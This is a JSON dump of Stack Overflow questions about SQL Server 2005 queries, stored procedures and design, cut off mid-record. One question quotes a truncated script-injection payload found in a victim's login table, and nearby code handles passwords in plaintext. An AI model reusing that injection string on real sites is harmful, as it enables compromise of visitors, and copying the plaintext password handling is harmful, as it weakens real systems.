</p>\n"},{"tags":["sql","tsql","sql-server-2005","sql-server-2005-express"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":53,"score":-1,"question_id":12790139,"title":"SQL server column alias from another query","body":"<p>Why does this code not work in SQL Server 2005?</p>\n\n<pre><code>select c.price AS (select CityName from Cities ci where ci.cityid= c.cityid)\nfrom prices c\nwhere cityid=1\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","auto-increment"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":4689,"score":3,"question_id":4810627,"title":"SQL Server 2005 ROW_NUMBER() without OVER","body":"<p>I am trying to insert from one table into another using</p>\n\n<pre><code>DECLARE @IDOffset int;\nSELECT @IDOffset = MAX(ISNULL(ID,0)) FROM TargetTable\n\nINSERT INTO TargetTable(ID, FIELD)\nSELECT [Increment] + @IDOffset ,FeildValue\nFROM SourceTable\nWHERE [somecondition]\n</code></pre>\n\n<p>TargetTable.ID is not an identity column, which is why I have to find a way to auto-increment it myself. </p>\n\n<p>I know I can use a cursor, or create a table variable with an identity column and a FieldValue field, populate that, then use it in my <code>insert into...select</code>, but that is not very efficient. I tried using the ROW_NUMBER function to increment, but I really don't have a legitimate ORDER BY field in the SourceTable that I can use, and would like to keep the original order of the SourceTable (if possible).</p>\n\n<p>Can anyone suggest anything?</p>\n"},{"tags":["sql-server","sql-server-2005","synchronization"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":5429,"score":1,"question_id":1078368,"title":"How to synchronize two SQL Server 2005 databases?","body":"<p>I'm looking for a tool (best for free) which can synchronize two SQL Server 2005 databases.</p>\n\n<p>I have a sql database that is hosted on a server and another sql database that is hosted on aclient. Both have the same database schema. Each client has its own sql server because the application needs to run offline.</p>\n\n<p>The client is being connected to the company network regularly (each day). When the connection is being established, I would like to run a delta synchronization with the tool. Not all data from the server database is required on the client database, just a subset which is determined by the user of the client computer.</p>\n\n<p>Do you know a tool which supports this?</p>\n\n<p>Best Regards<br />Oliver Hanappi</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":47,"score":-6,"question_id":12788268,"title":"The Best Database Script With Query List For Best Practice \"SQL\"","body":"<p>Can any one give \nThe Best Database Script With Query List For Best Practice  \"SQL\".</p>\n\n<p>-Regards \n Dipan</p>\n"},{"tags":["sql","sql-server-2005","sum"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12783189,"title":"SQL SUM confusion","body":"<p>I have run the below query for my data:-</p>\n\n<pre><code>SELECT     CONTRACTNAME,\n           AccountNo,\n           TransDate, \n           JournalNo,\n           AuditTrail,           \n           Description,       \n           CONTRACTNUMBER,\n           GROUPING(CONTRACTNUMBER) as CONTRACTNUMBER,   \n           SUM(PAFeebillamount)as Total  \nFROM       SRVS.dbo.BTQGLDistributionsWithProjectCodesHM\nWHERE      TransDate &gt; '2012' AND CONTRACTNUMBER &lt;&gt; '00900'\nGROUP BY   CONTRACTNAME,  \n           AccountNo,   \n           TransDate,\n           JournalNo, \n           AuditTrail,    \n           Description,      \n           CONTRACTNUMBER with rollup  \nORDER BY   GROUPING (CONTRACTNUMBER) \n</code></pre>\n\n<p>this gives me the results:-</p>\n\n<p><img src=\"http://i.stack.imgur.com/Qvu9S.png\" alt=\"enter image description here\"></p>\n\n<p>how can I change this so I get a single line Total for each contract number.  So it looks like the below example:-</p>\n\n<p><img src=\"http://i.stack.imgur.com/YukDc.png\" alt=\"enter image description here\"></p>\n\n<p>at this moment in time I am not bothered about the accnt no / journal no etc as it is only going to be a summary.</p>\n\n<p>Just looking for advice on best way to sum up my groups by contract number?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","pivot","unpivot"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12782349,"title":"SQL Join Query - Group By / Aggregation","body":"<p>I realise this question has been asked before in many forms but I am struggling to apply every answer I've found to my specific table. To start - straight to the details.</p>\n\n<p>Table A has four columns (Unique ID, Number, Revision, Date). When executing a select * from A, the result set is as follows -</p>\n\n<pre><code>ID | Number | Revision | Date\n------------------------------------\n01 | 12345  | 1        | 01/01/2010\n02 | 12345  | 2        | 01/04/2010\n03 | 123    | 1        | 01/12/2010\n04 | 1234   | 1        | 09/09/2012\n05 | 12345  | 3        | 09/12/2012\n</code></pre>\n\n<p>I would like the dates for each Revision in a single row per Number, e.g. for Number 12345, the query would return</p>\n\n<pre><code>ID | Number | Revision | Date | Revision 2 | Revision 2 Date | Revision 3 | Revision 3 Date |\n---------------------------------------------------------------------------------------------\n01 | 12345  | 1 | 01/01/2010 |2  | 01/04/2010      | 3 |  09/12/2012|\n</code></pre>\n\n<p>I understand the syntax would be similar to</p>\n\n<pre><code>SELECT Revision, Date \nFROM (\nSELECT NUMBER \nFROM A) as B INNER JOIN ON a.Number = B.Number \nGROUP BY a.Number\n</code></pre>\n\n<p>However this still returns a row for each combination, I would like only the results shown above.</p>\n\n<p>I would appreciate any suggestions or hints!</p>\n"},{"tags":["sql-server","sql-server-2005","ssis"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12782507,"title":"For Loop based on Variable - SSIS","body":"<p>I have a script task in which I specify the variables like this:</p>\n\n<pre><code>Public Sub Main()\n\n    Dts.Variables(\"sTest\").Value = 1\n\n    Dts.TaskResult = Dts.Results.Success\nEnd Sub\n</code></pre>\n\n<p>The value for the variable is specified from a front-end code.</p>\n\n<p>Next I have a for loop container that internally contains a script task.</p>\n\n<p>I want to pass the variable that is dynamically entered in the external script task into the loop and hence execute a message box defined in the script task.</p>\n\n<p>The message box dynamically shows values as and when specified</p>\n\n<p><img src=\"http://i.stack.imgur.com/Uo2bc.png\" alt=\"enter image description here\"></p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12779540,"title":"SQL Grouping Error","body":"<p>I am running the below SQL but keep getting the error:- </p>\n\n<blockquote>\n  <p>'Column 'SRVS.dbo.BTQGLDistributionsWithProjectCodesHM.AccountNo' is invalid in the select list because it is not contained in either an\n  aggregate function or the GROUP BY clause.</p>\n</blockquote>\n\n<p>The code I am running is:-</p>\n\n<pre><code>SELECT         AccountNo, \n           TransDate, \n           JournalNo, \n           AuditTrail, \n           Description, \n           JnlAmount, \n           ACTINDX, \n           CONTRACTNAME, \n           PAPROJNUMBER,GROUPING(PAPROJNUMBER) as PAPROJNUMBER, \n           SUM(PAFeebillamount) as total\nFROM       SRVS.dbo.BTQGLDistributionsWithProjectCodesHM\nGROUP BY   PAPROJNUMBER with rollup\nORDER BY   GROUPING (PAPROJNUMBER\n</code></pre>\n\n<p>Can anyone point me in the correct direction on this?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":295,"score":3,"question_id":647901,"title":"Algorithm for the following homework","body":"<p>You require an algorithm to read in one customer's account balance at the begining of the month, a total of all withdrawals for the month, and a total of all deposits made during the month. A federal tax charge of 1% is applied to all transactions made during the month. The program is to calculate the account balance at end of the month by (1) subtracting the total withdrawals from the account balance at the beginning of the month, (2) adding the total deposits to new balance, (3) calculating the federal tax (1% of total transactions - that is, total withdrawals+total deposits), and (4) subtracting this federal tax from the new balance. After these calculations, print the final end-of-month balance. </p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12779005,"title":"Table schema to store daily hits for many items?","body":"<p>In my Sql Server 2005 database, I'm considering two ways of creating a table to track daily views on 100,000 items:</p>\n\n<p>Option 1) Each day would insert a new row for each item. So the table columns would look like this:  </p>\n\n<pre><code>| ItemID | Date | #ofHits |  \n</code></pre>\n\n<p>That would mean the table grows by 100,000 rows per day.  </p>\n\n<p>Option 2) Each row would contain an entire month's hits per item. So the table columns would look like this:  </p>\n\n<pre><code>| ItemID | Year | Month | Day01Hits | Day02Hits | Day03Hits | ... | Day31Hits |\n</code></pre>\n\n<p>That would mean the tables grows by 100,000 rows per month.  </p>\n\n<p>Option 3) Perhaps you have a better idea altogether?  </p>\n\n<p>Keep in mind performance, such as when doing a sum of all hits between two dates (i.e. total hits for July 5th-Aug12th). Also, I'd want to keep at least 1 year of historical data.</p>\n\n<p>On a related note, we're simply parsing the IIS logs nightly to get the hit data.</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":408,"score":0,"question_id":3098879,"title":"TSQL Reverse FOR XML Encoding","body":"<p>I am using FOR XML in a query to join multiple rows together, but the text contains quotes, \"&lt;\", \">\", etc.  I need the actual character instead of the encoded value like \"&quot;\" etc.  Any suggestions?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","loops","while-loop"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":7999,"score":2,"question_id":1725379,"title":"sql while loop with date counter","body":"<p>I need to do something like this in sql:</p>\n\n<pre><code>declare @StartDate varchar(10)\ndeclare @EndDate varchar(10)\nset @StartDate='12/31/2008'\nset @EndDate='1/11/2009'\n\nDeclare @date varchar = @StartDate\nwhile (@date &lt;= @EndDate)\nbegin\n -- some statements\nset @date += 1 -- basically increment by 1 day\nend\n</code></pre>\n\n<p>How can I do the above correctly in SQL?  Basically, my startdate and enddate are strings and not datetimes because my business logic is referencing string column in another table with a date as the name of the column-But I need to loop through a bunch of columns, each column having the name of the next day's date.</p>\n\n<p>If the date is 11/07/2009, the name of the column would be '11/7/2009' (without the 0 in the 7), so I have to watch out for that too.</p>\n\n<p>Any help is appreciated!</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":4,"up_vote_count":4,"down_vote_count":0,"view_count":4015,"score":4,"question_id":7388420,"title":"get DATEDIFF excluding weekends using sql server","body":"<p>I am using this query to get time taken.</p>\n\n<pre><code>SELECT DATEDIFF(dd, ActualStartDate, ActualCompletionDate) AS TimeTaken\nFROM TableName\n</code></pre>\n\n<p>Now I want to exclude weekends and only include Mon-Fri as days counted.</p>\n"},{"tags":["sql","sql-server-2005","sql-injection","injection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12775644,"title":"Username and password injected in my table","body":"<p>I am new to asp.net development</p>\n\n<p>I develop login form with username and password </p>\n\n<p>I finished off with my work but any how my <code>login</code> table has injected with sort of script as </p>\n\n<p>username</p>\n\n<pre><code>\"&gt; &lt;/title&gt;&lt;script src=\"http://it\n</code></pre>\n\n<p>password</p>\n\n<pre><code>\"&gt; &lt;/title&gt;&lt;script src=\"http://it\n</code></pre>\n\n<p>I have written simple query as </p>\n\n<pre><code>SELECT * FROM user WHERE userid = 'admin' AND password = 'ms2012'\n</code></pre>\n\n<p>I thought some body has injected in a username and password textbox</p>\n\n<p>But I don't understand how they did. Can anybody explain <strong>how they have updated it</strong> and <strong>what should I do to avoid it?</strong></p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":232,"score":0,"question_id":11047612,"title":"List All Tables Modified in Last N Days","body":"<p>How to get the list of all tables modified in the last <em>N</em> days?</p>\n"},{"tags":["sql","sql-server-2005","types"],"answer_count":3,"favorite_count":1,"up_vote_count":9,"down_vote_count":1,"view_count":459,"score":8,"question_id":4869539,"title":"Is There ANY Sense in SQL Data Type VARCHAR(1)?","body":"<p>I've bumped into a lot of VARCHAR(1) fields in a database I've recently had to work with.  I rolled my eyes: obviously the designer didn't have a clue.  But maybe I'm the one who needs to learn something.  Is there any conceivable reason to use a VARCHAR(1) data type rather than CHAR(1)?  I would think that the RDMS would convert the one to the other automatically.</p>\n\n<p>The database is MS SQL 2K5, but evolved from Access back in the day.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12770105,"title":"Is there any way to run the definition of multiple stored procedure at a time?","body":"<p>I have created the definition of more than 200 stored procedures. My problem is that I have to execute them on a different server and on a different database.\nThe process which I am following is that first I check each stored procedure that it exists on that server and database or not. If not then I create them else I drop the earlier definition and create the new one.</p>\n\n<p>So I just wanted to know that is there any other way out. As I have to perform this activity for each stored procedure. I want to create a script or so, which can run and create the definition of all my stored procedure on the server and database.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12769991,"title":"How to execute multiple stored procedures at a time?","body":"<p>I want to know that is there any way through which I can execute all my stored procedure at a time.\nPresently I am executing each stored procedure using <code>exec \"Stored Procedure name\"</code> command.\nAnd I have more than 200 stored procedure to be executed on my database.</p>\n\n<p>Is there any easy way out to execute all these stored procedure at a single time as it is difficult for me to keep a track of them?</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":12756223,"title":"T-SQL: Count and Group By Across Multiple Columns","body":"<p>I have the following table:</p>\n\n<pre>\nName | Col1 | Col2 | Col3\nJohn   A      B      C\nJohn   A      D      A\nBill   A      A      D\nBill   F      A      A\nSteve  F      A      B\nSteve  C      C      A\n</pre>\n\n<p>I want to know a total of how many As John, Bill, and Steve have...</p>\n\n<p>e.g. John: 3, Bill: 4, Steve: 2</p>\n\n<p>How could I do this using T-SQL? Thanks.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12767344,"title":"SQL Server 2005 stored procedure error","body":"<p>I have created a stored procedure of insert command for employee details in SQL Server 2005 in which one of the parameters is an image for which I have used <code>varbinary</code> as the datatype in the table.. </p>\n\n<p>But when I am adding that parameter in the stored procedure I am getting the following error-</p>\n\n<blockquote>\n  <p><em>Implicit conversion from data type varchar to varbinary is not\n  allowed. Use the CONVERT function to run this query.</em></p>\n</blockquote>\n\n<p>Stored procedure:</p>\n\n<pre><code>( \n    @Employee_ID nvarchar(10)='', \n    @Password nvarchar(10)='', \n    @Security_Question nvarchar(50)='', \n    @Answer nvarchar(50)='', \n    @First_Name nvarchar(20)='',\n    @Middle_Name nvarchar(20)='', \n    @Last_Name nvarchar(20)='', \n    @Employee_Type nvarchar(15)='', \n    @Department nvarchar(15)='', \n    @Photo varbinary(50)='' \n)\n\ninsert into Registration\n(\n      Employee_ID,\n      Password,      \n      Security_Question,\n      Answer,\n      First_Name,\n      Middle_Name,\n      Last_Name,\n      Employee_Type,\n      Department,     \n      Photo     \n)\nvalues\n(\n      @Employee_ID,\n      @Password,     \n      @Security_Question,\n      @Answer,\n      @First_Name,\n      @Middle_Name,\n      @Last_Name,\n      @Employee_Type,\n      @Department,      \n      @Photo   \n     )\n</code></pre>\n\n<p>Table structure:</p>\n\n<pre><code>Column Name        Data Type                 Allow Nulls\nEmployee_ID    nvarchar(10)             Unchecked\nPassword       nvarchar(10)              Checked\nSecurity_Question   nvarchar(50)         Checked\nAnswer             nvarchar(50)              Checked\nFirst_Name     nvarchar(20)              Checked\nMiddle_Name    nvarchar(20)              Checked\nLast_Name      nvarchar(20)              Checked\nEmployee_Type      nvarchar(15)              Checked\nDepartment     nvarchar(15)              Checked\nPhoto              varbinary(50)         Checked\n</code></pre>\n\n<p>Code in vb.net for calling stored procedure-></p>\n\n<p>Public Function Submit(ByVal obj As UserData, ByVal opt As String) As Boolean</p>\n\n<pre><code>    Using cnn As New SqlConnection(conn)\n        Using cmd As New SqlCommand\n            cmd.Connection = cnn\n            If opt = \"Submit\" Then\n                cmd.CommandText = \"sp_emp_Registration\"\n            End If\n\n            cmd.CommandType = CommandType.StoredProcedure\n            cmd.Parameters.Add(New SqlParameter(\"@Employee_ID\", obj.EmpID))\n            cmd.Parameters.Add(New SqlParameter(\"@Password\", obj.Pwd))\n            cmd.Parameters.Add(New SqlParameter(\"@Security_Question\", obj.SecQues))\n            cmd.Parameters.Add(New SqlParameter(\"@Answer\", obj.Ans))\n            cmd.Parameters.Add(New SqlParameter(\"@First_Name\", obj.Firstname))\n            cmd.Parameters.Add(New SqlParameter(\"@Middle_Name\", obj.Middlename))\n            cmd.Parameters.Add(New SqlParameter(\"@Last_Name\", obj.Lastname))\n            cmd.Parameters.Add(New SqlParameter(\"@Employee_Type\", obj.EmpType))\n            cmd.Parameters.Add(New SqlParameter(\"@Department\", obj.dept))                \n            cmd.Parameters.Add(New SqlParameter(\"@Photo\", obj.photo))\n\n            cnn.Open()\n            Try\n                If (cmd.ExecuteNonQuery() &gt; 0) Then\n                    cnn.Close()\n                    Return True\n                Else\n                    Return False\n                End If\n            Catch ex As Exception\n                Return False\n            End Try\n        End Using\n    End Using\nEnd Function\n</code></pre>\n\n<p>I am not getting what to do..can anyone give me some suggestion or solution?\nThanks in advance.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12756320,"title":"SQL Server 2005 money format","body":"<p>I have been using SQL Server 2005, and I need to store some columns in database in <code>Money</code> format.</p>\n\n<p>But SQL Server stores them like this --> <code>0000.0000</code>, but I only want 2 digits after the decimal point  --->  <code>0000.00</code> </p>\n\n<p>Do I have to control this in the program or there is a way to change this format in SQL Server 2005 ? </p>\n\n<p>Thanks in advance </p>\n"},{"tags":["database","sql-server-2005","mdf"],"answer_count":5,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":2558,"score":3,"question_id":3498342,"title":"Where does SQL Server 2005 keep the .mdf files?","body":"<p>I'm upgrading from SQL Server 2005 to 2008.  I've detached the database I need, but can't find it on the file system. </p>\n\n<p>Where does a default installation of SQL Server 2005 store these?</p>\n"},{"tags":["sql-server-2005","systemtime"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":256,"score":1,"question_id":3703031,"title":"MS SQL 2005: Any way to temporarily set the system date for a T-SQL script to a different date?","body":"<p>We have a bunch of T-SQL scripts dependent on today's date and when they run.  If one doesn't run on the week it should, we end up temporarily setting the system time a day before, run the script, then set it back.</p>\n\n<p>Is there anyway to temporarily set the system date for a script without changing the original script, like when you execute it or only for that session?</p>\n"},{"tags":["sql","visual-studio-2010","sql-server-2005","database-project"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":182,"score":2,"question_id":12081856,"title":"Visual studio 2010 database project allowing stored procedure with invalid SQL to build","body":"<p>I have a database project that is specifed as 2005. (This is on the properties screen under the project settings. )</p>\n\n<p>We have several servers we deploy and run against production is 2005 but we have some 2008 R2 servers that we develop against so we specify the project as 2005.</p>\n\n<p>I have added stored proc which I created on a 2008R2 database which is used only for development. It all works fine so I added it to the database project. The project built and deployed fine meaning that it generates the .sql file. We do not apply changes from the VS Project.</p>\n\n<p>We have a CI TFS build that runs against a 2005 database. (we have several configurations and each 'deploys' against a different database). It built and deployed fine. Again it only generated the updates into an SQL file.</p>\n\n<p>The stored proc contains the following code:</p>\n\n<pre><code>    insert SiteCAChargeParameterSet\n    values (\n             ( select siteID \n                 from SiteCAChargeParameterSet\n                where SiteCAChargeParameterSetID = @OldSiteCAChargeParameterSet\n              ),\n                @NewSetName,0,0,@UserID, @currentDate,@UserID, @currentDate\n            )\n</code></pre>\n\n<p>All of the variables are defined.\nWhen I try to create this stored proc on the 2005 database I get an error (1046) that indicates that the select is not allowed \"Subqueries are not allowed in this context.\"</p>\n\n<p>My question is why does the compiler permit this. Clearly since I have indicated that this is a sql server 2005 project it should follow rules for that version. Further, since it is comparing against a 2005 database for the deploy is should also know that this is illegal. </p>\n\n<p>I am hoping thereis an option somewhere that I don't have turned on or something like that. \nOr is this just an error in the SQL 'compiler'.</p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":4,"favorite_count":8,"up_vote_count":10,"down_vote_count":42,"view_count":1104,"score":-32,"question_id":3448821,"title":"What is the best way to save the articles?","body":"<p>I am using WMD editor to post the article.</p>\n\n<p>Should I save the complete encoded HTML or only the text user entered into the editor and at the time of rendering the recond on page use the prityprint to colored it?</p>\n\n<p>OR</p>\n\n<p>Should I save the WMD output and render as it is on the page?</p>\n\n<p>OR</p>\n\n<p>We need to use a different editor text box on the page?</p>\n\n<p>OR</p>\n\n<p>Give suggestion to use the editor and save articles in database in the for of simple text or HTML?</p>\n\n<p>Thanks in advance!!!!</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":8,"favorite_count":4,"up_vote_count":11,"down_vote_count":0,"view_count":9679,"score":11,"question_id":1883071,"title":"How do I find the data directory for a SQL Server instance?","body":"<p>We have a few <em>huge</em> databases (20GB+) which mostly contain static lookup data.  Because our application executes joins against tables in these databases, they have to be part of each developers local SQL Server (i.e. they can't be hosted on a central, shared database server).  </p>\n\n<p>We plan on copying a canonical set of the actual SQL Server database files (*.mdf and *.ldf) and attach them to each developer's local database.</p>\n\n<p>What's the best way to find out the local SQL Server instance's data directory so we can copy the files to the right place?  This will be done via an automated process, so I have to be able to find and use it from a build script.</p>\n"},{"tags":["c#","asp.net","sql","database","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":388,"score":0,"question_id":7753642,"title":"Database wrapper like Massive by Rob Conery for SQL Server 2005 and ASP.NET 2.0","body":"<p>Yes I still use the older version of the .NET Framework &amp; love it. Would like to use a database wrapper now <a href=\"https://github.com/robconery/massive\" rel=\"nofollow\">massive</a> by rob is awesome if I had 3.5 but Nooooo.</p>\n\n<ul>\n<li>You got any suggestions for a database wrapper ? </li>\n</ul>\n\n<p>Please don't suggest a ORM(ex NHibernate, Active Record) all we do is write stored procedures and supply them parameters in our data access layer. Nothing more nothing less, we are thinking of abstracting away parameters as object now thinking wrapper might be out there or rolling out our own.</p>\n"},{"tags":["sql-server-2005","ssis","import","append","dts"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1872,"score":2,"question_id":3425883,"title":"SSIS 2005: \"Append rows to the destination table\" is greyed out. Why?","body":"<p>In SQL Server 2005, Import Data (SSIS), my desire is to import a text file and have it append to an existing table.   The first time through the wizard on the Column Mappings step I swear the <strong>Append rows to the destination table</strong> radio button was enabled.  But, now, it's disabled (grey) and even re-starting the wizard won't cause it to re-enable.</p>\n\n<p>Is there some secret/magic I don't know about?  How do I get that option to re-enable so that I can append (rather than <strong>Create destination table</strong>)? </p>\n"},{"tags":["sql","sql-server-2005","inner-join"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12753511,"title":"Bad row estimates joining two tables on date range","body":"<h2>Tables</h2>\n\n<ul>\n<li>TEST_RUNS (ID int, Date_Time datetime, Row1 int, Row2 int, Row3 int, Row4 int)</li>\n<li>ADMIN_TIME_FILTER (ID int, Name varchar(20), Start_Date datetime, End_Date datetime)</li>\n</ul>\n\n<p><strong>ADMIN_TIME_FILTER</strong> holds a small list of shifting date ranges that get updated frequently via automation.  We have common date ranges (ThisYear, ThisDay, etc) and some more esoteric ranges.  This table exists strictly as a way to filter data out of TEST_RUNS in a join.</p>\n\n<p><strong>TEST_RUNS</strong> holds actual data we care about, and has millions of rows.  We have a bunch of defined views joining these two tables together, so we can just update the ADMIN_TIME_FILTER table and have the changes propagate to the views.  Aside from date, there are no rows that link these two tables together.</p>\n\n<h2>Queries</h2>\n\n<p>The problem is that the estimated row count is widly off, resulting in poor performing queries.  Here's a simple query the exhibits the bad estimate:</p>\n\n<pre><code>with test as (\n    SELECT a.* FROM TEST_RUNS a\n    INNER JOIN ADMIN_TIME_FILTER b ON b.ID = 5 -- ID for ThisYear range\n       AND a.date_time BETWEEN b.start_date AND b.end_date\n)\nselect count(*) from test \n</code></pre>\n\n<p>Here's the query plan:</p>\n\n<p><img src=\"http://i.stack.imgur.com/YT7ZQ.png\" alt=\"queryplan\"></p>\n\n<p>Statistics aren't the problem.  I can run the following query and get an accurate row estimate</p>\n\n<pre><code>with test as (\n    select tr.* from test_runs tr\n    where tr.date_time between '2012-01-01 00:00:00' and '2012-12-31 00:00:00'\n)\nselect count(*) from test\n</code></pre>\n\n<h2>Help</h2>\n\n<p>Switching away from our join methodology isn't a simple task, so I'm looking for an alternative to improve the row estimate.</p>\n\n<p>Indexed views don't appear to be a viable option due to the performance implications.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12752136,"title":"What is the best way to get start date and end date of the week between two dates in SQL","body":"<p>I work with SQL Server 2005. I have a start and end date.</p>\n\n<p>Ex:</p>\n\n<pre><code>START_DATE    END_DATE\n2011-04-24    2012-05-05 \n</code></pre>\n\n<p>I want to get all the start day (SQL is set so that it's sunday) and end day (saturday) of each week between the two dates.</p>\n\n<p>Desired result :</p>\n\n<pre><code>2011-04-24    2011-04-30\n2011-05-01    2011-05-07\n2011-05-08    2011-05-14\n....\n2012-04-29    2012-05-05\n</code></pre>\n\n<p>Now I know I could do something like <code>DATEADD(week, 1, 2011-04-24)</code> until I get to my end date, but I don't quite see how to do it until I get to my end date (without having a cursor or a while). I would like to do it in one query.</p>\n\n<p>Can anyone help?</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12753513,"title":"Single rowset in variable","body":"<p>I m stuck at this place. I m trying to get a single rowset value in a variable.</p>\n\n<pre><code>DECLARE @last_timestamp as varchar;\nSET @last_timestamp = SELECT MAX(modify_timestamp) FROM dbo.table1\nPRINT @last_timestamp\n</code></pre>\n\n<p>It is returning the below error</p>\n\n<pre><code>Msg 156, Level 15, State 1, Line 2\nIncorrect syntax near the keyword 'SELECT'.\n</code></pre>\n\n<p>Is Cursor the only solution to this problem. Any help would be helpful ?</p>\n"},{"tags":["sql-server-2005","vb6"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12752515,"title":"VB6 How to catch an ADO Command Timeout error and display custom MsgBox","body":"<p>I have looked through all of the VB6 Error Numbers to no avail, and it seems the command object itself takes care of the error messagebox in the background. What I need to know is if their is someway to change the MsgBox for the ADODB.CommandTimeout error itself. My first thoughts were to just catch the error (using error numbers) and then set a MsgBox that way. However, I can't find any documentation on any error numbers handling ADO Events. Any suggestions?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":454,"score":2,"question_id":2644281,"title":"How many maximum recursion possible for CTE in SQL server?","body":"<p>How many maximum recursion level possible for CTE in SQL server? If maximum recursion level is reached then what are the alternative way?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12751126,"title":"Join two select queries together","body":"<p>I have two select queries that I need to combine....</p>\n\n<pre><code>  SELECT [DatapointID]\n  ,[AssetID]\n  ,[DatapointID]\n  ,[SourceTag]\n  ,'-' + [TimeStep] + [TimeStepValue] AS TimeStep\n  ,[DataRetrievalInterval] + [DataRetrievalIntervalValue] AS [RetInterval]\n  ,NULL AS DatapointDate\n  ,NULL AS DatapointValue\n  ,0 As DataFlagID\n  ,DateADD(-1, d @SearchDateEnd) + @SearchTimeEnd DateDataGrabbed\n  ,GetDate() DateTimeAddedtoDB\nFROM [dbo].[tblTSS_Assets_Datapoints]\nWhere AssetID = 204     \n\n\nSelect DatapointDate, SUM(DataPointValue) as DataPointValue From @temp\nGROUP BY DatapointDate\nORDER BY DatapointDate\n</code></pre>\n\n<p>The first select query is what I want the end result to be however instead of NULL As the DatapointDate and DatapointValue I want the values from the @temp</p>\n\n<p>How can I do this?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12742197,"title":"Combining 2 one columns statements into 1 two column statement","body":"<p>Let say I have two select statements (This is  just an example. Data could be text also):</p>\n\n<pre><code> S1        S2\n| 1 |    | a |\n| 2 |    | b |  \n| 3 |    | c |\n| 4 |    | d |\n| 5 |    | e |\n</code></pre>\n\n<p>How can I \"glue\" them together into one statement but with one column each like this:</p>\n\n<pre><code> S1         S2          S3\n| 1 |     | a |     | 1   a |\n| 2 |     | b |     | 2   b |  \n| 3 |  +  | c |  =  | 3   c |  \n| 4 |     | d |     | 4   d |\n| 5 |     | e |     | 5   e |\n</code></pre>\n\n<p>And if that is even possible, will it be resistant to null or empty statements like this?:</p>\n\n<pre><code> S1         S2           S3\n| 1 |     |NULL|     | 1  NULL|\n| 2 |                | 2  NULL|\n| 3 |  +          =  | 3  NULL|\n| 4 |                | 4  NULL|\n| 5 |                | 5  NULL|\n</code></pre>\n\n<p>The two statements have no keys, but do belong to each other row wise (unless one of them is null). </p>\n\n<p>I know this can be done using while loops, cursors and temp tables. The problem is I need this to be fast and don't use that many resources, because this statement will be fired a lot. Maybe some of you know a neat trick to achieve this or have a suggestion how solve it?</p>\n\n<p><strong>What is this used for?:</strong>\nWhat this solution is for is a log system that need to take the trigger tables UPDATED and INSERTED, translate each row into a XML part and 